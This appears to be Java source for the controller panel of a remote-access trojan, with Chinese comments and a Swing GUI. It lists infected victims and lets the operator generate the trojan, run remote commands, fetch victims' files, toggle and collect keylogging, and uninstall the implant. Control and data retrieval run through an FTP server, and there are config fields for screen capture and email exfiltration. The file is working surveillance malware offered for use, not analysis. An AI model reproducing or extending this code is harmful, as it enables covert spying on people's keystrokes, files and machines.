package com.QQPanel;

import java.io.*;
import java.util.*;
import java.util.Timer;
import java.util.concurrent.ConcurrentHashMap;
import java.awt.*;
import java.awt.event.*;
import java.awt.Rectangle;
import javax.swing.*;
import javax.swing.border.*;
import javax.swing.BorderFactory;
import sun.net.ftp.FtpClient;

import com.config.ConfigPanel;
import com.config.UploadConfig;
import com.dogkey.CheckDog;
import com.enc.Blowfish;
import com.topking.ftp.bean.ConfigBean;
import com.topking.ftp.bean.UserInfoBean;
import com.topking.ftp.ui.MainFrame;
import com.topking.ftp.util.FileupdataUtil;
import com.topking.ftp.util.GetFTP;

/**
 * @author duomeng 用户管理端面板
 */
public class ICQPOP extends JFrame implements ActionListener {
	/**
	 * serialVersionUID
	 */
	private static final long serialVersionUID = 1L;
	public JPanel jPanel = new JPanel(); // 创建面板
	private JTabbedPane jTabbedPane1 = new JTabbedPane(); // 创建选项卡
	private JLabel jLabeltab = new JLabel(); // 创建标签
	public JPopupMenu Rpop = new JPopupMenu(); // 菜单的实现

	ImageIcon back = new ImageIcon(this.getClass().getClassLoader()
			.getResource("com/QQPanel/image/calendar_16.gif")); // 根据calendar_16创建back的图像图标
	ImageIcon log = new ImageIcon(this.getClass().getClassLoader()
			.getResource("com/QQPanel/image/zoomp_24.gif")); // 根据link_16创建log的图像图标
	ImageIcon log2 = new ImageIcon(this.getClass().getClassLoader()
			.getResource("com/QQPanel/image/xiaxian.png")); // 根据note_16创建log2的图像图标
	public JScrollPane jsp = new JScrollPane(); // 创建滚动条
	public JList iconJList = new JList(); // 创建列表
	JButton bfind = new JButton(); // 添加木马
	JButton check = new JButton(); // 判断是否在线
	JButton quit = new JButton(); // 退出
	TitledBorder titledBorder1 = new TitledBorder("");// 创建一个标题为空的边框
	public DefaultListModel dlm = new DefaultListModel();

	private JMenuItem Configgenerate;
	private JMenuItem Commandline;
	private JMenuItem GetFile;
	private JMenuItem Getlogkey;
	private JMenuItem Rload;
	private JMenuItem Rdelete;
	private JMenuItem RdeleteRemote;
	public String remotePath;
	int friendnum;// 好友数量
	JTextField icqnos = new JTextField();
	JTextField nametext = new JTextField();
	public Map<Integer, String> infomap = new ConcurrentHashMap<Integer, String>();
	public Map<String, String> cfgmap = new HashMap<String, String>();
	public Map<String, String> timemap = new HashMap<String, String>();
	public Map<String, Integer> nummap = new HashMap<String, Integer>();
	Timer Fileuptimer;

	// 构造函数用于初始化
	@SuppressWarnings("static-access")
	public ICQPOP() {
		try {
			java.awt.Image img;
			System.out.println("ICQPOP");
			img = getToolkit().getDefaultToolkit().getImage(
					this.getClass().getClassLoader()
					.getResource("com/QQPanel/image/apple20.png"));// 返回一幅图像
			super.setIconImage(img);
			//new CheckDog().checkdog(false);
			jbInit();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	// 初始化面板
	private void jbInit() throws Exception {
		this.setTitle("操作台");
		this.setFont(new java.awt.Font("Monospaced", Font.PLAIN, 12));
		this.setSize(285, 550);
		this.getContentPane().setLayout(null);
		this.getContentPane().setBackground(new Color(255, 238, 255));
		this.setResizable(false);// 设置大小是否可变
		Toolkit kit = Toolkit.getDefaultToolkit();
		this.setLocation(kit.getScreenSize().width / 10 * 4,
				kit.getScreenSize().height / 5);
		this.addWindowListener(new WindowAdapter() {
			public void windowClosing(WindowEvent e) {
				System.err.println("退出命令");
				disposeCloseWindow();
				Fileuptimer.cancel();
				System.exit(0);
				// this.setVisible(false);
			}
		});

		ListCellRenderer renderer = new qqNameAndPicListCellRenderer();
		iconJList.setAlignmentX((float) 1.0);
		iconJList.setAlignmentY((float) 1.0);
		iconJList.setCellRenderer(renderer);
		iconJList.setVisibleRowCount(7);
		iconJList.updateUI();
		iconJList.addMouseListener(new java.awt.event.MouseAdapter() {
			public void mousePressed(MouseEvent e) {
				list_mouseClicked(e);
			}
		});
		jsp.getViewport().add(iconJList);
		jsp.getViewport().setBackground(new Color(255, 238, 255));
		jsp.setBounds(new Rectangle(-3, 20, 270, 405));
		jTabbedPane1.setTabPlacement(JTabbedPane.BOTTOM);
		jTabbedPane1.setBackground(new Color(255, 238, 255));
		jTabbedPane1.setBounds(new Rectangle(3, 1, 269, 455));

		jLabeltab.setToolTipText("");
		jLabeltab.setBounds(new Rectangle(0, 485, 273, 11));
		bfind.setToolTipText("");
		bfind.setText("生成木马");
		bfind.setBounds(new Rectangle(26, 461, 118, 25));
		bfind.setIcon(log);
		bfind.addActionListener(this);
		quit.setToolTipText("");
		quit.setText("退出");
		quit.setIcon(log2);
		quit.setBounds(new Rectangle(172, 461, 84, 25));
		quit.addActionListener(this);
		this.getContentPane().add(bfind);
		this.getContentPane().add(jTabbedPane1);
		this.getContentPane().add(jLabeltab);
		this.getContentPane().add(quit);
		this.setVisible(true);

		Rpop = new JPopupMenu();
		Configgenerate = new JMenuItem("配置修改");
		Commandline = new JMenuItem("命令执行");
		GetFile = new JMenuItem("文件获取");
		Getlogkey = new JMenuItem("获取键盘记录");
		Rload = new JMenuItem("刷新");
		RdeleteRemote = new JMenuItem("删除远程木马");
		Rdelete = new JMenuItem("删除本地木马");

		Configgenerate.addActionListener(this);
		Commandline.addActionListener(this);
		GetFile.addActionListener(this);
		Getlogkey.addActionListener(this);
		Rload.addActionListener(this);
		RdeleteRemote.addActionListener(this);
		Rdelete.addActionListener(this);

		Rpop.add(Configgenerate);
		Rpop.add(Commandline);
		Rpop.add(GetFile);
		Rpop.add(Getlogkey);
		Rpop.add(Rload);
		Rpop.add(RdeleteRemote);
		Rpop.add(Rdelete);

		jTabbedPane1.add(jPanel);
		jTabbedPane1.setTitleAt(0, "用户");
		File userFile = new File("USERINFO.config");
		if (userFile.exists()) { // 判断保存用户信息的文本文件是否存在
			String s = new String();
			int i = 0;
			FileInputStream fis = new FileInputStream(userFile);// 存在，就读取该文件
			InputStreamReader isr = new InputStreamReader(fis);
			BufferedReader br = new BufferedReader(isr);
			while ((s = br.readLine()) != null) { // 读文件的每一行
				Blowfish crypt = new Blowfish("USERINFO.config");
				System.out.println("开始解密");
				String stren = s.toString();
				stren = crypt.decryptString(stren);
				int j = 0;
				System.out.println(stren);
				while (j < stren.length()) {
					String temp = "";
					while (j < stren.length() && stren.charAt(j) != '\r'
							&& stren.charAt(j) != '\n') {
						temp += stren.charAt(j);
						j++;
					}
					while (j < stren.length()
							&& (stren.charAt(j) == '\r' || stren.charAt(j) == '\n'))
						j++;
					System.out.println(i + "::" + temp);
					String str[] = temp.split(",");// 每一行以逗号作为分隔标记，分成2列
					String infostr = new String();
					infostr = temp;
					infomap.put(i, infostr);
					timemap.put(str[1], "0-0-0-0,0");
					nummap.put(str[1], 0);
					Object[] obj = new Object[str.length];// 新建个i行7列的二维数组
					for (int n = 0; n < obj.length; n++) {
						obj[n] = str[n];// 每一列存放在obj数组对应的行列中
					}
					dlm.addElement(obj);
					i++;// i为最后需要返回的行数
				}
			}
			br.close();
			isr.close();
			fis.close();

			iconJList = new JList(dlm);// dlm为DefaultListModel格式，添加到iconJList中
			iconJList.setCellRenderer(new CellRenderer());
			iconJList.addMouseListener(mouseListener);
			jsp = new JScrollPane(iconJList);
			jPanel.setLayout(new BorderLayout());
			jPanel.add(jsp);
			// jPanel.add(jScrollPane);
		} else {
			userFile.createNewFile();
			iconJList = new JList(dlm);// dlm为DefaultListModel格式，添加到iconJList中
			iconJList.setCellRenderer(new CellRenderer());
			iconJList.addMouseListener(mouseListener);
			jsp = new JScrollPane(iconJList);
			jPanel.setLayout(new BorderLayout());
			jPanel.add(jsp);
		}
		File cfgFile = new File("USERCFG.config");
		if (cfgFile.exists()) { // 判断保存用户配置的文件是否存在
			String s = new String();
			// int i = 0;
			FileInputStream fis = new FileInputStream(cfgFile);// 存在，就读取该文件
			InputStreamReader isr = new InputStreamReader(fis);
			BufferedReader br = new BufferedReader(isr);
			while ((s = br.readLine()) != null) { // 读文件的每一行
				// System.out.println(i+"::"+s);
				String[] cfgstr = s.split("::");
				cfgmap.put(cfgstr[0], cfgstr[1]);
				// i++;// i为最后需要返回的行数
			}
			br.close();
			isr.close();
			fis.close();
		} else {
			cfgFile.createNewFile();
		}

		Fileuptimer = new Timer();
		Fileuptimer.schedule(new FileupdateTask(this), 7 * 1000, 1 * 60 * 1000);
	}

	Object[][] StringtoObjiet(String s) {
		Object[][] obj = null;
		return obj;
	}

	public void copyFile(String oldPath, String newPath, String projectName) { // 文件拷贝
		try {
			int bytesum = 0;
			int byteread = 0;
			File oldfile = new File(oldPath);
			File dirFile = new File(newPath + projectName);
			dirFile.createNewFile();
			if (oldfile.exists()) { // 文件存在时
				InputStream inStream = new FileInputStream(oldPath); // 读入原文件
				FileOutputStream fs = new FileOutputStream(newPath
						+ projectName);
				byte[] buffer = new byte[1444];
				// int length;
				while ((byteread = inStream.read(buffer)) != -1) {
					bytesum += byteread; // 字节数 文件大小
					System.out.println(bytesum);
					fs.write(buffer, 0, byteread);
				}
				fs.flush();
				fs.close();
				inStream.close();
			}
		} catch (Exception e) {
			System.err.println("复制单个文件操作出错ICQPOP.296" + e.getMessage());
			// e.printStackTrace();
		}
	}

	public void copyFolder(String oldPath, String newPath) { // 文件夹拷贝
		try {
			(new File(newPath)).mkdirs(); // 如果文件夹不存在 则建立新文件夹
			File a = new File(oldPath);
			String[] file = a.list();
			File temp = null;
			for (int i = 0; i < file.length; i++) {
				if (oldPath.endsWith(File.separator)) {
					temp = new File(oldPath + file[i]);
				} else {
					temp = new File(oldPath + File.separator + file[i]);
				}

				if (temp.isFile()) {
					FileInputStream input = new FileInputStream(temp);
					FileOutputStream output = new FileOutputStream(newPath
							+ "/" + (temp.getName()).toString());
					byte[] b = new byte[1024 * 5];
					int len;
					while ((len = input.read(b)) != -1) {
						output.write(b, 0, len);
					}
					output.flush();
					output.close();
					input.close();
				}
				if (temp.isDirectory()) {// 如果是子文件夹
					copyFolder(oldPath + "/" + file[i], newPath + "/" + file[i]);
				}
			}
		} catch (Exception e) {
			System.err.println("复制整个文件夹内容操作出错");
			e.printStackTrace();
		}
	}

	/**
	 * 各种相应执行
	 */
	public void actionPerformed(ActionEvent e) {
		if (e.getSource() == Configgenerate) {
			System.err.println("action:修改配置");
			int index = iconJList.getSelectedIndex();
			if (index >= 0) {
				String information = infomap.get(index);
				System.out.println("information=" + information);
				UserInfoBean uib = setUserInfo(information);
				String configStr = cfgmap.get(uib.getUserID());
				ConfigBean cfb = serConFig(configStr);
				new ConfigPanel(this, uib, cfb); // 右键生成配置
			}
		}

		if (e.getSource() == Commandline) {
			System.err.println("action:命令执行");
			int index = iconJList.getSelectedIndex();
			if (index >= 0) {
				String information = infomap.get(index);
				System.out.println("information=" + information);
				UserInfoBean uib = setUserInfo(information);
				String configStr = cfgmap.get(uib.getUserID());
				ConfigBean cfb = serConFig(configStr);
				new CommandWindow(this, uib, cfb);
			}
		}

		if (e.getSource() == GetFile) {// 右键获取文件
			System.err.println("action:获取文件");
			int index = iconJList.getSelectedIndex();
			if (index >= 0) {
				String information = infomap.get(index);
				System.out.println("information=" + information);
				UserInfoBean uib = setUserInfo(information);
				String configStr = cfgmap.get(uib.getUserID());
				ConfigBean cfb = serConFig(configStr);
				new GetRemoteFile(this, uib, cfb);
			}
		}
		if (e.getSource() == Getlogkey) {// 右键获取键盘记录
			System.err.println("action:获取键盘记录");
			int index = iconJList.getSelectedIndex();
			if (index >= 0) {
				String information = infomap.get(index);
				System.out.println("information=" + information);
				UserInfoBean uib = setUserInfo(information);
				String configStr = cfgmap.get(uib.getUserID());
				ConfigBean cfb = serConFig(configStr);
				if (cfb.getLogKey()) {
					cfb.setLogKey(false);
				} else
					cfb.setLogKey(true);
				cfgmap.put(uib.getUserID(), cfb.toString());
				new UploadConfig(uib, cfb);
			}
		}

		if ((e.getSource() == Rload) || (e.getSource() == check)) {
			System.err.println("action:检查在线");
			int index = iconJList.getSelectedIndex();
			if (index >= 0) {
				String information = infomap.get(index);
				System.out.println("information=" + information);
				UserInfoBean uib = setUserInfo(information);
				System.out.println("FileupdateTask:检查在线");
				FileupdataUtil fudb = new FileupdataUtil(this, uib);
				fudb.start();
			}
		}

		if (e.getSource() == RdeleteRemote) {// 右键-删除远程木马
			System.err.println("action:删除远程木马文件");
			int index = iconJList.getSelectedIndex();
			if (index >= 0) {
				String information = infomap.get(index);
				System.out.println("information=" + information);
				UserInfoBean uib = setUserInfo(information);
				String configStr = cfgmap.get(uib.getUserID());
				ConfigBean cfb = serConFig(configStr);
				int result = JOptionPane.showOptionDialog(this, "是否确定删除木马:"
						+ uib.getUserName(), "删除木马", JOptionPane.YES_NO_OPTION,
						JOptionPane.DEFAULT_OPTION, null, new Object[] { "是",
								"否" }, JOptionPane.YES_OPTION);
				if (result == 0) {
					cfb.setUnInstall(true);
					cfgmap.put(uib.getUserID(), cfb.toString());
					new UploadConfig(uib, cfb);
				}
			}
		}

		if (e.getSource() == Rdelete) {// 删除按钮
			System.err.println("action:删除本地木马残余文件");
			int num = infomap.size();
			int index = iconJList.getSelectedIndex();
			if (index >= 0) {
				String information = infomap.get(index);
				System.out.println("information=" + information);
				UserInfoBean uib = setUserInfo(information);
				FtpClient myFtp = new GetFTP(uib.getFtpUrl(), uib.getFtpName(),
						uib.getFtpPasswd()).getFtp();
				if (myFtp == null)
					return;
				try {
					myFtp.ascii();
				} catch (IOException e2) {
					System.err.println("error in ICQPOP 418:" + e2.toString());
					// e2.printStackTrace();
				}
				String userName = uib.getUserName();
				System.out.println("userName=" + userName);
				int result = JOptionPane.showOptionDialog(this, "是否确定删除用户:"
						+ userName, "删除用户", JOptionPane.YES_NO_OPTION,
						JOptionPane.DEFAULT_OPTION, null, new Object[] { "是",
								"否" }, JOptionPane.YES_OPTION);
				if (result == 0) {
					MainFrame mFrame = new MainFrame(myFtp);
					if (mFrame.deleteDirectory("/" + uib.getUserID(), true)) {
						System.out.println("delete FTPdirectory=" + "/"
								+ uib.getUserID() + " success!");
					} else {
						JOptionPane.showMessageDialog(this, "删除用户FTP目录失败 异常信息("
								+ ")", "错误", JOptionPane.ERROR_MESSAGE);
					}
					infomap.remove(index);
					dlm.remove(index);
					if (index != num - 1) {
						for (int i = index; i < num - 1; i++) {
							infomap.put(i, infomap.get(i + 1));
						}
						infomap.remove(num - 1);
					}
					return;
				}
			}
		}

		if (e.getSource() == quit) {
			System.err.println("退出命令");
			disposeCloseWindow();
			Fileuptimer.cancel();
			System.exit(0);
			this.dispose();
		}

		if (e.getSource() == bfind) {// 添加好友
			new AddUser(this);
		}
	}

	/**
	 * 程序退出处理函数 将用户信息map——infomap和配置信息map——cfgmap写入文件中
	 */
	public void disposeCloseWindow() {
		try {
			String userinfo;
			String userInfoStr = "";
			Iterator<Map.Entry<Integer, String>> userit = infomap.entrySet()
					.iterator();
			while (userit.hasNext()) {
				Map.Entry<Integer, String> entry = userit.next();
				userinfo = entry.getValue() + "\r\n";
				userInfoStr = userInfoStr + userinfo;
			}
			Blowfish crypt = new Blowfish("USERINFO.config");
			System.out.println("开始加密");
			String stren = userInfoStr.toString();
			stren = crypt.encryptString(stren);
			BufferedWriter out;
			// 写userInfo2到USERINFO.config文件中
			out = new BufferedWriter(new OutputStreamWriter(
					new FileOutputStream("USERINFO.config")));
			out.write(stren);
			out.flush();
			out.close();

			String cfginfo;
			String cfgInfoStr = "";
			Iterator<Map.Entry<String, String>> cfgit = cfgmap.entrySet()
					.iterator();
			while (cfgit.hasNext()) {
				Map.Entry<String, String> entry = cfgit.next();
				cfginfo = entry.getKey() + "::" + entry.getValue() + "\r\n";
				cfgInfoStr = cfgInfoStr + cfginfo;
			}
			BufferedWriter bufW;
			// 写用户配置到USERCFG.config文件中
			bufW = new BufferedWriter(new OutputStreamWriter(
					new FileOutputStream("USERCFG.config")));
			bufW.write(cfgInfoStr);
			bufW.flush();
			bufW.close();

		} catch (FileNotFoundException e2) {
			e2.printStackTrace();
		} catch (IOException e1) {
			e1.printStackTrace();
		}
	}

	void list_mouseClicked(MouseEvent e) {
		System.out.println("list_mouseClicked:" + e.getButton());
		if (e.getButton() == 3) {
			Rpop.setVisible(true);
			// Rpop.show(iconJList, e.getX(), e.getY());
			Rpop.show(this, e.getX() + 20, e.getY() + 20);
		}
	}

	// 双击左键
	MouseListener mouseListener = new MouseAdapter() {
		public void mouseClicked(MouseEvent e) {
			if (e.getClickCount() == 2) {
				String localPath = null;
				int index = iconJList.locationToIndex(e.getPoint());
				String information = infomap.get(index);
				System.out.println("information=" + information);
				if (information == null)
					return;
				UserInfoBean uib = setUserInfo(information);
				String userName = uib.getUserID();
				FtpClient myFtp = new GetFTP(uib.getFtpUrl(), uib.getFtpName(),
						uib.getFtpPasswd()).getFtp();
				if (myFtp == null)
					return;
				try {
					myFtp.ascii();
				} catch (IOException e2) {
					System.err.println("error in ICQPOP 523:" + e2.toString());
					// e2.printStackTrace();
				}
				new ProgressBar(null, null, "正在打开远程FTP,请稍候……", "打开成功", "打开失败！");
				// 判断是否设置了本地路径
				localPath = uib.getLocalPath();
				if(localPath!=null){
					localPath = setLocalPath(localPath);
				}
				MainFrame.LOCpath[0] = localPath;
				System.err.println("locPath=" + MainFrame.LOCpath[0]);
				// 判断并打开远程ftp
				MainFrame mFrame = new MainFrame(myFtp);
				mFrame.setVisible(true);
				if (mFrame.ftp.serverIsOpen()) {
					try {
						System.out.println("MainFrame.remotePath+userName: "
								+ mFrame.remotePath + userName + "/");
						mFrame.ftp.cd(mFrame.remotePath + userName + "/");
						mFrame.remotePath = mFrame.remotePath + userName + "/";
						mFrame.refreshRemotePath();
						mFrame.loadRemoteFile();
					} catch (IOException e1) {
						e1.printStackTrace();
					}
				} else {
					JOptionPane.showMessageDialog(null, "服务器已经关闭，操作失败", "错误",
							JOptionPane.ERROR_MESSAGE);
				}
			}
			// 右键单击
			if (e.getButton() == 3) {
				System.out.println("右键开启");
				Rpop.setVisible(true);
				Rpop.show(iconJList, e.getX(), e.getY());
			}
		}
	};

	// 创建本地文件夹
	public boolean createLocalDir(String dir) {
		boolean flag = true;
		if (!isExistDir(dir)) {
			if (!(new File(dir).mkdir())) {
				flag = false;
			}
		}
		return flag;
	}

	// 判断本地文件夹是否存在
	public boolean isExistDir(String dir) {
		boolean flag = false;
		if (new File(dir).exists()) {
			flag = true;
		}
		return flag;
	}

	private String setLocalPath(String path) {
		if (path.length() != 3) {
			if (!path.endsWith("\\")) {
				while (path.contains("\\")) {
					path = path.replaceAll("\\\\", "//");
				}
				path = path.concat("/");
			} else {
				while (path.contains("\\")) {
					path = path.replaceAll("\\\\", "//");
				}
				path = path.substring(0, path.length() - 1);
			}

		} else
			path = path.replaceAll("\\\\", "/");
		return path;
		/*
		 * try { JFileChooser fc = new JFileChooser();
		 * fc.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
		 * fc.setDialogTitle("设置本地路径"); if (fc.showSaveDialog(fc) == 0) { String
		 * s = new String(); s = fc.getSelectedFile().getPath(); if (s.length()
		 * != 3) { while (s.contains("\\")) { s = s.replaceAll("\\\\", "//"); }
		 * s = s.concat("/"); } else s = s.replaceAll("\\\\", "/"); locaPath =
		 * s; } else { return; } BufferedWriter out; out = new
		 * BufferedWriter(new OutputStreamWriter(//
		 * 写userInfo2到USERINFO.config文件中 new
		 * FileOutputStream("locationPath.config"))); out.write(locaPath);
		 * out.flush(); out.close(); } catch (FileNotFoundException e1) {
		 * e1.printStackTrace();// 存在，就读取该文件 } catch (IOException e1) {
		 * e1.printStackTrace(); }
		 */
	}

	private UserInfoBean setUserInfo(String userInfo) {
		String ui = "";
		if (userInfo == null) {
			return new UserInfoBean();
		}
		ui = new String(userInfo);
		UserInfoBean uib = new UserInfoBean();
		String str[] = ui.split(",");// 每一行以逗号作为分隔标记，分成2列
		if (str.length >= 7) {
			uib.setUserName(str[0].trim());
			uib.setUserID(str[1].trim());
			uib.setFtpUrl(str[2].trim());
			uib.setFtpName(str[3].trim());
			uib.setFtpPasswd(str[4].trim());
			uib.setUserIcon(str[5].trim());
			uib.setLocalPath(str[6].trim());
		}
		return uib;
	}

	private ConfigBean serConFig(String configStr) {
		String cfbstr = "";
		if (configStr == null) {
			return new ConfigBean();
		}
		cfbstr = new String(configStr);
		// try {
		// ui = new String(userInfo.getBytes("ISO-8859-1"),"UTF-8");
		// } catch (UnsupportedEncodingException e) {
		// e.printStackTrace();
		// }
		ConfigBean cfb = new ConfigBean();
		String str[] = cfbstr.split("#");// 每一行以逗号作为分隔标记，分成2列
		if (str.length >= 13) {
			if (str[0].contains("true")) {
				cfb.setUnInstall(true);
			}
			if (str[1].contains("false")) {
				cfb.setScreenCapture(false);
			}
			if (str[2].contains("true")) {
				cfb.setScreenTimeCapture(true);
			}
			if (str[3].contains("true")) {
				cfb.setKeyBoard(true);
			}
			if(str[4].contains("true")){
				cfb.setLogKey(true);
			}
			if (!str[5].equals("")) {
				cfb.setIntervelTime(str[5].trim());
			}
			if (!str[6].equals("")) {
				cfb.setIntervelScreenTime(str[6].trim());
			}
			if (!str[7].equals("")) {
				cfb.setCommandStr(str[7].trim());
			}
			if (!str[8].equals("")) {
				cfb.setRemoteFilePath(str[8].trim());
			}
			if (!str[9].equals("")) {
				cfb.setEmailURL(str[9].trim());
			}
			if (!str[10].equals("")) {
				cfb.setEmailName(str[10].trim());
			}
			if (!str[11].equals("")) {
				cfb.setEmailPassWD(str[11].trim());
			}
			if (!str[12].equals("")) {
				cfb.setEmailAttachment(str[12].trim());
			}
		}
		return cfb;
	}
}

class FileupdateTask extends TimerTask {
	private ICQPOP icqPOP;

	public FileupdateTask(ICQPOP icq) {
		this.icqPOP = icq;
	}

	public void run() {
		System.out.println("FileupdateTask:检查在线");
		Threadrun();
	}

	private void Threadrun() {
		int num = icqPOP.infomap.size();
		FileupdataUtil[] eachThread = new FileupdataUtil[num];
		for (int i = 0; i < num; i++) {
			UserInfoBean uib = setUserInfo(icqPOP.infomap.get(i));
			eachThread[i] = new FileupdataUtil(icqPOP, uib);
			eachThread[i].start();
		}
		try {
			for (int i = 0; i < num; i++) {
				eachThread[i].join();
			}
			sortPanel();
		} catch (InterruptedException e) {
		}
	}

	// 排序函数
	private void sortPanel() {
		System.out.println("---------开始排序---------");
		int num = icqPOP.infomap.size();
		String sort[] = new String[num];
		int number = 0;
		for (int i = 0; i < num; i++) {// 在线
			UserInfoBean uiBean = setUserInfo(icqPOP.infomap.get(i));
			if (uiBean.getUserIcon().contains("-1.jpg")) {
				sort[number] = icqPOP.infomap.get(i);
				number++;
			}
		}
		for (int i = 0; i < num; i++) {// 离线有文件
			UserInfoBean uiBean = setUserInfo(icqPOP.infomap.get(i));
			if (uiBean.getUserIcon().contains("-3.jpg")) {
				sort[number] = icqPOP.infomap.get(i);
				number++;
			}
		}
		for (int i = 0; i < num; i++) {// 离线无文件
			UserInfoBean uiBean = setUserInfo(icqPOP.infomap.get(i));
			if ((!uiBean.getUserIcon().contains("-3.jpg"))
					&& (!uiBean.getUserIcon().contains("-1.jpg"))
					&& (!uiBean.getUserIcon().contains("-2.jpg"))
					&& (!uiBean.getUserIcon().contains("-4.jpg"))) {
				sort[number] = icqPOP.infomap.get(i);
				number++;
			}
		}
		for (int i = 0; i < num; i++) {// FTP不可达
			UserInfoBean uiBean = setUserInfo(icqPOP.infomap.get(i));
			if (uiBean.getUserIcon().contains("-2.jpg")) {
				sort[number] = icqPOP.infomap.get(i);
				number++;
			}
		}
		for (int i = 0; i < num; i++) {// 木马已卸载
			UserInfoBean uiBean = setUserInfo(icqPOP.infomap.get(i));
			if (uiBean.getUserIcon().contains("-4.jpg")) {
				sort[number] = icqPOP.infomap.get(i);
				number++;
			}
		}
		for (int i = 0; i < number; i++) {
			icqPOP.dlm.remove(0);
		}
		for (int i = 0; i < number; i++) {
			icqPOP.infomap.remove(i);
			icqPOP.infomap.put(i, sort[i]);
			UserInfoBean uiBean = setUserInfo(icqPOP.infomap.get(i));
			String[] obj = new String[7];
			obj[0] = uiBean.getUserName();
			obj[1] = uiBean.getUserID();
			obj[2] = uiBean.getFtpUrl();
			obj[3] = uiBean.getFtpName();
			obj[4] = uiBean.getFtpPasswd();
			obj[5] = uiBean.getUserIcon();
			obj[6] = uiBean.getLocalPath();
			icqPOP.dlm.addElement(obj);
		}
		icqPOP.iconJList.removeAll();
		icqPOP.iconJList.setModel(icqPOP.dlm);
		icqPOP.iconJList.setCellRenderer(new CellRenderer());
	}

	private UserInfoBean setUserInfo(String userInfo) {
		String ui = "";
		ui = new String(userInfo);
		UserInfoBean uib = new UserInfoBean();
		String str[] = ui.split(",");// 每一行以逗号作为分隔标记，分成2列
		if (str.length >= 7) {
			uib.setUserName(str[0].trim());
			uib.setUserID(str[1].trim());
			uib.setFtpUrl(str[2].trim());
			uib.setFtpName(str[3].trim());
			uib.setFtpPasswd(str[4].trim());
			uib.setUserIcon(str[5].trim());
			uib.setLocalPath(str[6].trim());
		}
		return uib;
	}
}

@SuppressWarnings("serial")
class qqNameAndPicListCellRenderer extends JLabel implements ListCellRenderer {
	private Border lineBorder = BorderFactory.createLineBorder(Color.red, 2),
			emptyBorder = BorderFactory.createEmptyBorder(2, 2, 2, 2);

	public qqNameAndPicListCellRenderer() {
		setOpaque(true);
	}

	public Component getListCellRendererComponent(JList list, Object value,
			int index, boolean isSelected, boolean cellHasFocus) {
		qqNameAndPicListModel model = (qqNameAndPicListModel) list.getModel();
		this.setBackground(UIManager.getColor("RadioButton.select"));
		setText(model.getName(value));
		setIcon(model.getIcon(value));
		if (isSelected) {
			setForeground(list.getSelectionForeground());// 设置前景色
			setBackground(list.getSelectionBackground());// 设置背景色
		} else {
			setForeground(list.getForeground());
			setBackground(list.getBackground());
		}
		if (cellHasFocus) {
			setBorder(lineBorder);
		} else {
			setBorder(emptyBorder);
		}
		return this;
	}
}

@SuppressWarnings("serial")
class qqNameAndPicListModel extends DefaultListModel {
	@SuppressWarnings("rawtypes")
	public qqNameAndPicListModel(Vector friendnames, Vector pics) {
		for (int i = 0; i < friendnames.size(); ++i) {
			addElement(new Object[] {friendnames.get(i),
					new ImageIcon(this.getClass().getClassLoader()
							.getResource("com/QQPanel/image/" + pics.get(i) + ".jpg")) });
		}
	}

	public String getName(Object object) {
		Object[] array = (Object[]) object;
		return (String) array[0];
	}

	public Icon getIcon(Object object) {
		Object[] array = (Object[]) object;
		return (Icon) array[1];
	}
}
